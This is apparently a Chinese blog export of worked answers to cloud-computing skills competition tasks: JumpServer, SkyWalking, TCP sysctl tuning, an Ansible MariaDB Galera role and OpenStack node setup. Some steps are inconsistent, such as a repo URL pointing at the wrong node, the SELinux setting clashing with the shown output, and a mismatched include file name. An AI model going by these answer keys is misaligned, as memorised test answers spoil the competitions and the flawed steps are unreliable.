<h3 id="【题目-9】应用部署：堡垒机部署-0-5-分"><a href="#【题目-9】应用部署：堡垒机部署-0-5-分" class="headerlink" title="【题目 9】应用部署：堡垒机部署[0.5 分]"></a>【题目 9】应用部署：堡垒机部署[0.5 分]</h3><p>使用提供的 OpenStack 平台申请一台 CentOS7.9 的云主机，使用提供的软件包安装JumpServer 堡垒机服务，并配置使用该堡垒机对接自己安装的 controller 和 compute 节点。完成后提交 JumpServer 节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查堡垒机部署正确计 0.5 分</span><br></pre></td></tr></table></figure>

<h3 id="【题目-10】skywalking-服务部署与应用-1-分"><a href="#【题目-10】skywalking-服务部署与应用-1-分" class="headerlink" title="【题目 10】skywalking 服务部署与应用[1 分]"></a>【题目 10】skywalking 服务部署与应用[1 分]</h3><p>使用提供的 OpenStack 私有云平台，申请一台 centos7.9 系统的云主机，使用提供的软件包安装 Elasticsearch 服务和 skywalking 服务，将 skywalking 的 UI 访问端口修改为 8888。接下来再申请一台CentOS7.9 的云主机，用于搭建gpmall 商城应用，并配置SkyWalking Agent， 将 gpmall 的 jar 包放置探针并启动。安装与配置完成后提交 skywalking 节点的用户名、密码和 IP 地址到答题框。登录物理OpenStack平台，使用CentOS7.9镜像创建两台云主机（node-1，mall），云主机类型使用4VCPU&#x2F;8GB内存&#x2F;100GB硬盘。创建后的云主机作为本次案例的实验节点。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.检查 skywalking 服务部署正确计 1 分</span><br></pre></td></tr></table></figure>



<h3 id="【题目-11】Linux-内核优化-1-分"><a href="#【题目-11】Linux-内核优化-1-分" class="headerlink" title="【题目 11】Linux 内核优化[1 分]"></a>【题目 11】Linux 内核优化[1 分]</h3><p>在使用 Linux 服务器的时候，TCP 协议规定，对于已经建立的连接，网络双方要进行四次挥手才能成功断开连接，如果缺少了其中某个步骤，将会使连接处于假死状态，连接本身占用的资源不会被释放。因为服务器程序要同时管理大量连接，所以很有必要保证无用的连接完全断开，否则大量僵死的连接会浪费许多服务器资源。创建一台 CentOS7.9 云主机，修改相应的配置文件，分别开启 SYN Cookies；允许将 TIME-WAIT sockets 重新用于新的 TCP 连接；开启TCP 连接中TIME-WAIT sockets 的快速回收；修改系統默认的 TIMEOUT 时间为 30。完成后提交修改节点的用户名、密码和 IP 地址到答题框。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加如下参数</span></span><br><span class="line">net.ipv4.tcp_syncookies = 1</span><br><span class="line">net.ipv4.tcp_tw_reuse = 1</span><br><span class="line">net.ipv4.tcp_tw_recycle = 1</span><br><span class="line">net.ipv4.tcp_fin_timeout = 30</span><br><span class="line"></span><br><span class="line">sysctl -p</span><br><span class="line">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="line">net.ipv4.tcp_syncookies = 1</span><br><span class="line">net.ipv4.tcp_tw_reuse = 1</span><br><span class="line">net.ipv4.tcp_tw_recycle = 1</span><br><span class="line">net.ipv4.tcp_fin_timeout = 30</span><br></pre></td></tr></table></figure>

<h2 id="【任务-3】私有云运维开发-10-分"><a href="#【任务-3】私有云运维开发-10-分" class="headerlink" title="【任务 3】私有云运维开发[10 分]"></a>【任务 3】私有云运维开发[10 分]</h2><h3 id="【题目-1】Ansible-服务部署：部署-MariaDB-集群-2-分"><a href="#【题目-1】Ansible-服务部署：部署-MariaDB-集群-2-分" class="headerlink" title="【题目 1】Ansible 服务部署：部署 MariaDB 集群[2 分]"></a>【题目 1】Ansible 服务部署：部署 MariaDB 集群[2 分]</h3><p>使用OpenStack 私有云平台，创建 4 台系统为centos7.9 的云主机，其中一台作为 Ansible 的母机并命名为 ansible，另外三台云主机命名为 node1、node2、node3；使用这一台母机， 编写 Ansible 脚本（在&#x2F;root 目录下创建 example 目录作为 Ansible 工作目录，部署的入口文件命名为 cscc_install.yaml ） ， 对其他三台云主机进行安装高可用数据库集群<br>（MariaDB_Galera_cluster，数据库密码设置为 123456）的操作（所需的安装包在 HTTP 服务中）。完成后提交 Ansible 节点的用户名、密码和 IP 地址到答题框。（考试系统会连接到你的Ansible 节点，去执行 Ansible 脚本，请准备好 Ansible 运行环境，以便考试系统访问）</p>
<p>（1）环境准备</p>
<h4 id="①ansible部署"><a href="#①ansible部署" class="headerlink" title="①ansible部署"></a>①ansible部署</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.创建工作目录</span></span><br><span class="line"><span class="built_in">mkdir</span> example</span><br><span class="line"><span class="built_in">cd</span> example</span><br><span class="line"></span><br><span class="line">vi ansible.cfg</span><br><span class="line">[defaults]</span><br><span class="line">inventory = /root/example/inventory   <span class="comment">###声明主机组</span></span><br><span class="line">remote_user = root</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建主机组</span></span><br><span class="line">vi inventory  <span class="comment">###设置主机组，便于后面“when模块”进行筛选使用</span></span><br><span class="line">[node1]</span><br><span class="line">node1</span><br><span class="line">[node2]</span><br><span class="line">node2</span><br><span class="line">[node3]</span><br><span class="line">node3</span><br><span class="line"></span><br><span class="line"><span class="comment">#将公钥进行上传</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.创建roles目录，编写playbook</span></span><br><span class="line"> <span class="built_in">mkdir</span> roles</span><br><span class="line"> <span class="built_in">cd</span> roles/</span><br><span class="line"> <span class="comment">#生成role</span></span><br><span class="line"> ansible-galaxy init mariadb-galera-cluster</span><br><span class="line"> <span class="built_in">cd</span> mariadb-galera-cluster</span><br><span class="line"> </span><br><span class="line"> <span class="comment">#编写file</span></span><br><span class="line"> <span class="built_in">cd</span> files</span><br><span class="line"> <span class="comment">#vi mariadb.repo</span></span><br><span class="line">[mariadb]</span><br><span class="line">name = MariaDB</span><br><span class="line">baseurl = http://yum.mariadb.org/10.4/centos7-amd64</span><br><span class="line">gpgkey=https://yum.mariadb.org/RPM-GPG-KEY-MariaDB</span><br><span class="line">gpgcheck=1</span><br><span class="line"></span><br><span class="line"> <span class="comment">#vi server1.cnf(需要创建三个server1,server2,server3，把&quot;wsrep_node_name=&quot;,“wsrep_node_address=”替换即可)</span></span><br><span class="line">[mysqld]</span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line">socket=/var/lib/mysql/mysql.sock</span><br><span class="line">bind-address=0.0.0.0</span><br><span class="line">user=mysql</span><br><span class="line"></span><br><span class="line">default_storage_engine=InnoDB</span><br><span class="line">innodb_autoinc_lock_mode=2</span><br><span class="line">innodb_flush_log_at_trx_commit=0</span><br><span class="line">innodb_buffer_pool_size=128M</span><br><span class="line"></span><br><span class="line">binlog_format=ROW</span><br><span class="line">log-error=/var/log/mysqld.log</span><br><span class="line"></span><br><span class="line">[galera]</span><br><span class="line">wsrep_on=ON</span><br><span class="line">wsrep_provider=/usr/lib64/galera-4/libgalera_smm.so</span><br><span class="line"></span><br><span class="line">wsrep_node_name=<span class="string">&#x27;galera1&#x27;</span></span><br><span class="line">wsrep_node_address=<span class="string">&quot;192.168.93.11&quot;</span></span><br><span class="line">wsrep_cluster_name=<span class="string">&#x27;galera-cluster&#x27;</span></span><br><span class="line">wsrep_cluster_address=<span class="string">&quot;gcomm://192.168.93.11,192.168.93.12,192.168.93.13&quot;</span></span><br><span class="line"></span><br><span class="line">wsrep_provider_options=<span class="string">&quot;gcache.size=300M; gcache.page_size=300M&quot;</span></span><br><span class="line">wsrep_slave_threads=4</span><br><span class="line">wsrep_sst_method=rsync</span><br><span class="line"></span><br><span class="line"> <span class="built_in">cd</span> tasks</span><br><span class="line"> <span class="comment">#编写yum.yml</span></span><br><span class="line"> vi yum.yml</span><br><span class="line">- name: <span class="built_in">mv</span> yum#若联网无需删除，但需修改repo添加repo</span><br><span class="line">  shell: <span class="string">&#x27;mv /etc/yum.repos.d/* /etc/yum&#x27;</span></span><br><span class="line">- name: copy mariadb-repo </span><br><span class="line">  copy: src=mariadb.repo dest=/etc/yum.repos.d/mariadb.repo</span><br><span class="line">- name: change repo</span><br><span class="line">   shell: sed -i <span class="string">&#x27;s#yum\.mariadb\.org#mirrors.ustc.edu.cn/mariadb/yum#&#x27;</span> /etc/yum.repos.d/mariadb.repo</span><br><span class="line">- name: install mariadb.galera.mysql-python</span><br><span class="line">  shell: <span class="string">&#x27;yum install -y MariaDB-server MariaDB-client rsync&#x27;</span></span><br><span class="line">   </span><br><span class="line">  <span class="comment">#编写service.yml</span></span><br><span class="line">- name: start node1 mariadb</span><br><span class="line">  service: name=mariadb state=started enabled=<span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">- name: <span class="built_in">set</span> node1 mysql_user</span><br><span class="line">  shell: mysqladmin -uroot password 123456</span><br><span class="line"></span><br><span class="line">- name: copy node1 config</span><br><span class="line">  copy: src=roles/mariadb-galera-cluster/files/server1.cnf dest=/etc/my.cnf.d/server.cnf</span><br><span class="line">  when: <span class="string">&quot;&#x27;node1&#x27; in group_names&quot;</span></span><br><span class="line"></span><br><span class="line">- name: copy node2 config</span><br><span class="line">  copy: src=roles/mariadb-galera-cluster/files/server2.cnf dest=/etc/my.cnf.d/server.cnf</span><br><span class="line">  when: <span class="string">&quot;&#x27;node2&#x27; in group_names&quot;</span></span><br><span class="line"></span><br><span class="line">- name: copy node3 config</span><br><span class="line">  copy: src=roles/mariadb-galera-cluster/files/server3.cnf dest=/etc/my.cnf.d/server.cnf</span><br><span class="line">  when: <span class="string">&quot;&#x27;node3&#x27; in group_names&quot;</span></span><br><span class="line"></span><br><span class="line">- name: stop node1 mariadb</span><br><span class="line">  service: name=mariadb state=stopped</span><br><span class="line">  when: <span class="string">&quot;&#x27;node1&#x27; in group_names&quot;</span></span><br><span class="line"></span><br><span class="line">- name: start node1 galera</span><br><span class="line">  shell: galera_new_cluster</span><br><span class="line">  when: <span class="string">&quot;&#x27;node1&#x27; in group_names&quot;</span></span><br><span class="line"></span><br><span class="line">- name: restart node2 mariadb</span><br><span class="line">  service: name=mariadb state=restarted</span><br><span class="line">  when: <span class="string">&quot;&#x27;node2&#x27; in group_names&quot;</span></span><br><span class="line"></span><br><span class="line">- name: restart node3 mariadb</span><br><span class="line">  service: name=mariadb state=restarted</span><br><span class="line">  when: <span class="string">&quot;&#x27;node3&#x27; in group_names&quot;</span></span><br><span class="line">  <span class="comment">#########这里面有个mysql_user模块，通过“ansible-doc -s mysql_user”来查看这个模块的不详细信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#编写 main.yml</span></span><br><span class="line">vi main.yml</span><br><span class="line">- include: install.yml</span><br><span class="line">- include: service.yml</span><br><span class="line"></span><br><span class="line"><span class="comment">#编写入口文件</span></span><br><span class="line">vi cscc_install.yaml</span><br><span class="line">- hosts: all</span><br><span class="line">  remote_user: root</span><br><span class="line">  roles:</span><br><span class="line">  - mariadb-galera-cluster</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>#文件在文档test</p>
<h4 id="②手动部署"><a href="#②手动部署" class="headerlink" title="②手动部署"></a>②手动部署</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/networken/article/details/106297814#关闭防火墙</span><br><span class="line">systemctl <span class="built_in">disable</span> --now firewalld</span><br><span class="line">sed -i <span class="string">&#x27;s/^SELINUX=enforcing$/SELINUX=disabled/&#x27;</span> /etc/selinux/config &amp;&amp; setenforce 0</span><br><span class="line"><span class="comment">#修改主机名</span></span><br><span class="line">hostnamectl set-hostname xxx</span><br><span class="line"><span class="comment">#修改主机名解析</span></span><br><span class="line"><span class="built_in">cat</span> &gt;&gt; /etc/hosts &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">192.168.93.11 galera1</span></span><br><span class="line"><span class="string">192.168.93.12 galera2</span></span><br><span class="line"><span class="string">192.168.93.13 galera3</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="comment">#配置yum源</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/yum.repos.d/mariadb.repo &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[mariadb]</span></span><br><span class="line"><span class="string">name = MariaDB</span></span><br><span class="line"><span class="string">baseurl = http://yum.mariadb.org/10.4/centos7-amd64</span></span><br><span class="line"><span class="string">gpgkey=https://yum.mariadb.org/RPM-GPG-KEY-MariaDB</span></span><br><span class="line"><span class="string">gpgcheck=1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="comment">#替换为中科大源</span></span><br><span class="line">sed -i <span class="string">&#x27;s#yum\.mariadb\.org#mirrors.ustc.edu.cn/mariadb/yum#&#x27;</span> /etc/yum.repos.d/mariadb.repo</span><br><span class="line"><span class="comment">#安装mariadb、galera和rsync,其中galera作为依赖自动安装</span></span><br><span class="line">yum install -y MariaDB-server MariaDB-client rsync</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置节点1</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/my.cnf.d/server.cnf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[mysqld]</span></span><br><span class="line"><span class="string">datadir=/var/lib/mysql</span></span><br><span class="line"><span class="string">socket=/var/lib/mysql/mysql.sock</span></span><br><span class="line"><span class="string">bind-address=0.0.0.0</span></span><br><span class="line"><span class="string">user=mysql</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">default_storage_engine=InnoDB</span></span><br><span class="line"><span class="string">innodb_autoinc_lock_mode=2</span></span><br><span class="line"><span class="string">innodb_flush_log_at_trx_commit=0</span></span><br><span class="line"><span class="string">innodb_buffer_pool_size=128M</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">binlog_format=ROW</span></span><br><span class="line"><span class="string">log-error=/var/log/mysqld.log</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[galera]</span></span><br><span class="line"><span class="string">wsrep_on=ON</span></span><br><span class="line"><span class="string">wsrep_provider=/usr/lib64/galera-4/libgalera_smm.so</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">wsrep_node_name=&#x27;galera1&#x27;</span></span><br><span class="line"><span class="string">wsrep_node_address=&quot;192.168.93.11&quot;</span></span><br><span class="line"><span class="string">wsrep_cluster_name=&#x27;galera-cluster&#x27;</span></span><br><span class="line"><span class="string">wsrep_cluster_address=&quot;gcomm://192.168.93.11,192.168.93.12,192.168.93.13&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">wsrep_provider_options=&quot;gcache.size=300M; gcache.page_size=300M&quot;</span></span><br><span class="line"><span class="string">wsrep_slave_threads=4</span></span><br><span class="line"><span class="string">wsrep_sst_method=rsync</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置节点二</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/my.cnf.d/server.cnf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[mysqld]</span></span><br><span class="line"><span class="string">datadir=/var/lib/mysql</span></span><br><span class="line"><span class="string">socket=/var/lib/mysql/mysql.sock</span></span><br><span class="line"><span class="string">bind-address=0.0.0.0</span></span><br><span class="line"><span class="string">user=mysql</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">default_storage_engine=InnoDB</span></span><br><span class="line"><span class="string">innodb_autoinc_lock_mode=2</span></span><br><span class="line"><span class="string">innodb_flush_log_at_trx_commit=0</span></span><br><span class="line"><span class="string">innodb_buffer_pool_size=128M</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">binlog_format=ROW</span></span><br><span class="line"><span class="string">log-error=/var/log/mysqld.log</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[galera]</span></span><br><span class="line"><span class="string">wsrep_on=ON</span></span><br><span class="line"><span class="string">wsrep_provider=/usr/lib64/galera-4/libgalera_smm.so</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">wsrep_node_name=&#x27;galera2&#x27;</span></span><br><span class="line"><span class="string">wsrep_node_address=&quot;192.168.93.12&quot;</span></span><br><span class="line"><span class="string">wsrep_cluster_name=&#x27;galera-cluster&#x27;</span></span><br><span class="line"><span class="string">wsrep_cluster_address=&quot;gcomm://192.168.93.11,192.168.93.12,192.168.93.13&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">wsrep_provider_options=&quot;gcache.size=300M; gcache.page_size=300M&quot;</span></span><br><span class="line"><span class="string">wsrep_slave_threads=4</span></span><br><span class="line"><span class="string">wsrep_sst_method=rsync</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="comment">#配置节点三：</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/my.cnf.d/server.cnf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[mysqld]</span></span><br><span class="line"><span class="string">datadir=/var/lib/mysql</span></span><br><span class="line"><span class="string">socket=/var/lib/mysql/mysql.sock</span></span><br><span class="line"><span class="string">bind-address=0.0.0.0</span></span><br><span class="line"><span class="string">user=mysql</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">default_storage_engine=InnoDB</span></span><br><span class="line"><span class="string">innodb_autoinc_lock_mode=2</span></span><br><span class="line"><span class="string">innodb_flush_log_at_trx_commit=0</span></span><br><span class="line"><span class="string">innodb_buffer_pool_size=128M</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">binlog_format=ROW</span></span><br><span class="line"><span class="string">log-error=/var/log/mysqld.log</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[galera]</span></span><br><span class="line"><span class="string">wsrep_on=ON</span></span><br><span class="line"><span class="string">wsrep_provider=/usr/lib64/galera-4/libgalera_smm.so</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">wsrep_node_name=&#x27;galera3&#x27;</span></span><br><span class="line"><span class="string">wsrep_node_address=&quot;192.168.93.13&quot;</span></span><br><span class="line"><span class="string">wsrep_cluster_name=&#x27;galera-cluster&#x27;</span></span><br><span class="line"><span class="string">wsrep_cluster_address=&quot;gcomm://192.168.93.11,192.168.93.12,192.168.93.13&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">wsrep_provider_options=&quot;gcache.size=300M; gcache.page_size=300M&quot;</span></span><br><span class="line"><span class="string">wsrep_slave_threads=4</span></span><br><span class="line"><span class="string">wsrep_sst_method=rsync</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动集群</span></span><br><span class="line">galera_new_cluster</span><br><span class="line">systemctl <span class="built_in">enable</span> mariadb</span><br><span class="line"></span><br><span class="line"><span class="comment">#另外两个</span></span><br><span class="line">systemctl <span class="built_in">enable</span> --now mariadb</span><br><span class="line">验证集群状态，默认未配置密码直接回车：</span><br><span class="line">[root@galera1 ~]# mysql -uroot -p -e <span class="string">&quot;SHOW STATUS LIKE &#x27;wsrep_cluster_size&#x27;&quot;</span></span><br><span class="line">Enter password: </span><br><span class="line">+--------------------+-------+</span><br><span class="line">| Variable_name      | Value |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| wsrep_cluster_size | 3     |</span><br><span class="line">+--------------------+-------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2023年金砖一带一路职业技能大赛云计算赛题</title>
    <url>/posts/a182640a.html</url>
    <content><![CDATA[<h1 id="A场次题目：Openstack-平台部署与运维"><a href="#A场次题目：Openstack-平台部署与运维" class="headerlink" title="A场次题目：Openstack 平台部署与运维"></a><strong>A场次题目：Openstack 平台部署与运维</strong></h1><h2 id="任务1-私有云平台环境初始化"><a href="#任务1-私有云平台环境初始化" class="headerlink" title="任务1 私有云平台环境初始化"></a>任务1 私有云平台环境初始化</h2><p>1.初始化操作系统 使用提供的用户名密码，登录竞赛云平台。根据表 1 中的 IP 地址规划，设置各服务器节点的 IP 地址，确保网络正常通信，设置控制节点主机名为 Contro ller，计算节点主机名为 Compute，并修改 hosts 文件将 IP 地址映射为主机名， 关闭防火墙并设置为开机不启动，设置 SELinux 为 Permissive 模式并设置永久 关闭。请查看控制节点和计算节点主机名，使用命令查看 SELinux 状态，使用 head 命令、tail 命令和 cut 命令提取出永久关闭 SELinux 的关键信息。 将以上命令及返回结果提交到答题框</p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220916111924107.png" alt="image-20220916111924107"></p>
<p><strong>配置host</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line"></span><br><span class="line">172.17.31.10	controller</span><br><span class="line">172.17.31.20	compute</span><br></pre></td></tr></table></figure>

<p><strong>关闭防火墙并设置为开机不启动</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br></pre></td></tr></table></figure>

<p><strong>关闭selinux并永久关闭</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">setenforce 0</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line"> SELINUX=Permissive</span><br></pre></td></tr></table></figure>

<p><strong>使用命令查看selinux状态</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">getenforce</span><br><span class="line"> Disabled</span><br></pre></td></tr></table></figure>

<p>2.挂载安装光盘镜像 将提供的 CentOS-7-x86_64-DVD-1804.iso 和 chinaskills_cloud_iaas.iso 光盘镜像上传到 Controller 节点 &#x2F;root 目录下，然后在 &#x2F;opt 目录下使用一条 命令创建&#x2F;centos 目录和&#x2F;iaas 目录，并将镜像文件 CentOS-7-x86_64-DVD-1804. iso 挂载到 &#x2F;centos 目录下，将镜像文件 chinaskills_cloud_iaas.iso 挂载到 &#x2F;iaas 目录下。 请将以上命令及返回结果返回到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /opt/centos</span><br><span class="line"><span class="built_in">mkdir</span> /opt/iaas</span><br><span class="line">mount chinaskills_cloud_iaas.iso /opt/iaas</span><br><span class="line">mount CentOS-7-x86_64-DVD-1804.iso /opt/centos</span><br></pre></td></tr></table></figure>

<p>3.搭建文件共享服务器在Controller节点上安装 vsftp 服务器设置开机自启动,请将以上命令 及返回结果提交到答题框。【0.5 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在controller节点</span></span><br><span class="line">yum install -y vsftpd</span><br><span class="line">vi /etc/vsftpd/vsftpd.conf</span><br><span class="line">  anon_root=/opt/</span><br><span class="line">systemctl start vsftpd</span><br><span class="line">systemctl <span class="built_in">enable</span> vsftpd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>4.设置 yum 源 </p>
<p>将 ftp 仓库设置为 &#x2F;opt&#x2F;，为 controller 节点设置本地 yum 源，yum 源文件名为 local.repo；为 compute 配置 ftp 源，yum 源文件名称为 ftp.repo,其中ftp服务器地址为 controller 节点 IP.请将两个节点的 yum 源文件内容提交到答题框。【0.5 分】 </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在controller节点</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/* /etc/yum</span><br><span class="line">vi /etc/yum.repos.d/local.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=iaas</span><br><span class="line">baseurl=file:///opt/iaas/iaas-repo</span><br><span class="line"></span><br><span class="line"><span class="comment">#在compute节点</span></span><br><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/* /etc/yum</span><br><span class="line">vi /etc/yum.repos.d/ftp.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://172.17.31.10/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=iaas</span><br><span class="line">baseurl=ftp://172.17.31.20/iaas/iaas-repo</span><br></pre></td></tr></table></figure>

<p>5.部署时间同步服务器 </p>
<p>在 Controller 节点上部署 chrony 服务器，允许其他节点同步时间，启动服务并设置为开机启动；在 compute 节点上指定 controller 节点为上游 NTP 服务器，重启服务并设为开机启动。</p>
<p> 请在控制节点上使用 chronyc 命令同步控制节点的系统时间。【1 分】</p>
<p><strong>#在centroller节点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> vi /etc/chrony.conf</span><br><span class="line">  # Use public servers from the pool.ntp.org project.</span><br><span class="line"># Please consider joining the pool (http://www.pool.ntp.org/join.html).</span><br><span class="line">#server 0.centos.pool.ntp.org iburst</span><br><span class="line">#server 1.centos.pool.ntp.org iburst</span><br><span class="line">#server 2.centos.pool.ntp.org iburst</span><br><span class="line">#server 3.centos.pool.ntp.org iburst</span><br><span class="line">server controller iburst</span><br><span class="line"># Record the rate at which the system clock gains/losses time.</span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line"></span><br><span class="line"># Allow the system clock to be stepped in the first three updates</span><br><span class="line"># if its offset is larger than 1 second.</span><br><span class="line">makestep 1.0 3</span><br><span class="line"></span><br><span class="line"># Enable kernel synchronization of the real-time clock (RTC).</span><br><span class="line">rtcsync</span><br><span class="line"></span><br><span class="line"># Enable hardware timestamping on all interfaces that support it.</span><br><span class="line">#hwtimestamp *</span><br><span class="line"></span><br><span class="line"># Increase the minimum number of selectable sources required to adjust</span><br><span class="line"># the system clock.</span><br><span class="line">#minsources 2</span><br><span class="line"></span><br><span class="line"># Allow NTP client access from local network.</span><br><span class="line">#allow 192.168.0.0/16</span><br><span class="line"></span><br><span class="line"># Serve time even if not synchronized to a time source.</span><br><span class="line">#local stratum 10</span><br><span class="line"></span><br><span class="line"># Specify file containing keys for NTP authentication.</span><br><span class="line">#keyfile /etc/chrony.keys</span><br><span class="line"></span><br><span class="line"># Specify directory for log files.</span><br><span class="line">logdir /var/log/chrony</span><br><span class="line"></span><br><span class="line"># Select which information is logged.</span><br><span class="line">#log measurements statistics tracking</span><br><span class="line">allow 172.17.31.0/24</span><br><span class="line">local stratum 10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">systemctl restart chronyd</span><br><span class="line">systemctl enable chronyd</span><br></pre></td></tr></table></figure>

<p><strong>在compute节点</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/chrony.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use public servers from the pool.ntp.org project.</span></span><br><span class="line"><span class="comment"># Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="comment">#server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server controller iburst</span><br><span class="line"><span class="comment"># Record the rate at which the system clock gains/losses time.</span></span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow the system clock to be stepped in the first three updates</span></span><br><span class="line"><span class="comment"># if its offset is larger than 1 second.</span></span><br><span class="line">makestep 1.0 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable kernel synchronization of the real-time clock (RTC).</span></span><br><span class="line">rtcsync</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable hardware timestamping on all interfaces that support it.</span></span><br><span class="line"><span class="comment">#hwtimestamp *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Increase the minimum number of selectable sources required to adjust</span></span><br><span class="line"><span class="comment"># the system clock.</span></span><br><span class="line"><span class="comment">#minsources 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow NTP client access from local network.</span></span><br><span class="line"><span class="comment">#allow 192.168.0.0/16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Serve time even if not synchronized to a time source.</span></span><br><span class="line"><span class="comment">#local stratum 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify file containing keys for NTP authentication.</span></span><br><span class="line"><span class="comment">#keyfile /etc/chrony.keys</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify directory for log files.</span></span><br><span class="line">logdir /var/log/chrony</span><br><span class="line"></span><br><span class="line"><span class="comment"># Select which information is logged.</span></span><br><span class="line"><span class="comment">#log measurements statistics tracking</span></span><br><span class="line"></span><br><span class="line">systemctl restart chronyd</span><br><span class="line">systemctl <span class="built_in">enable</span> chronyd</span><br></pre></td></tr></table></figure>

